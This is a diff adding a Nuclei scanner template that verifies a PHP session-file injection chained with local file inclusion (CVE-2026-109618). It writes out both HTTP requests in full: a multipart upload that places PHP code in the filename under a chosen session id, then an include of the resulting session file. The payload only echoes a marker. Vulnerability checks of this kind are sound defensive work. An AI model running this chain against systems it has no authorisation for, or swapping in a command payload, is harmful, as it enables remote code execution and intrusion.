@@ -1,0 +1,83 @@
+id: php2shell-session-injection-lfi
+
+info:
+  name: php2shell - Session File Injection to LFI (CVE-2026-109618)
+  author: ikow,opencode
+  severity: critical
+  description: |
+    Verifies the php2shell session file injection chain against an
+    application that already has a local file inclusion primitive. The
+    template uploads a multipart body with an attacker-controlled PHPSESSID
+    and a PHP marker in the filename, then includes the resulting session
+    file through the supplied LFI endpoint. A match proves that the filename
+    was written verbatim into the session file and that the file is
+    includable. The injected payload only prints a random marker; it does not
+    execute operating-system commands.
+
+    Required variables:
+      lfi_path      Path and parameter of the LFI, for example
+                    /vuln.php?page= or /index.php?file=
+      session_path  Session save path plus the sess_ prefix, for example
+                    /tmp/sessions/sess_ or /var/lib/php/sessions/sess_
+
+    The target must have session.upload_progress.cleanup disabled so the
+    progress entry survives until the include request. If cleanup is On, the
+    session file is emptied at the end of the upload request. The target must
+    also have session.use_strict_mode disabled; strict mode rejects the
+    attacker-supplied, non-existent session id. Both settings match the
+    vulnerable lab configuration in the research repository.
+  reference:
+    - https://github.com/ikow/php2shell-poc
+    - https://github.com/ikow/php2shell-poc/blob/main/docs/ANALYSIS.md
+    - https://github.com/ikow/php2shell-poc/blob/main/poc/verify_session_injection.py
+  classification:
+    cve-id: CVE-2026-109618
+    cwe-id: CWE-94
+    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    cvss-score: 9.2
+  tags: cve,cve2026,php,php2shell,session,lfi,rce
+  metadata:
+    max-request: 2
+    verified: true
+    related-cve: CVE-2026-109619
+
+variables:
+  marker: "NUCLEI{{rand_base(10)}}"
+  sid: "nuclei{{rand_base(24)}}"
+  upload_path: "/"
+  lfi_path: "/vuln.php?page="
+  session_path: "/tmp/sessions/sess_"
+
+http:
+  - raw:
+      - |
+        POST {{upload_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----Nuclei{{marker}}
+        Connection: close
+
+        ------Nuclei{{marker}}
+        Content-Disposition: form-data; name="PHPSESSID"
+
+        {{sid}}
+        ------Nuclei{{marker}}
+        Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+        {{marker}}
+        ------Nuclei{{marker}}
+        Content-Disposition: form-data; name="f"; filename="<?php echo '{{marker}}'; ?>"
+        Content-Type: text/plain
+
+        Z
+        ------Nuclei{{marker}}--
+      - |
+        GET {{lfi_path}}{{session_path}}{{sid}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    disable-cookie: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
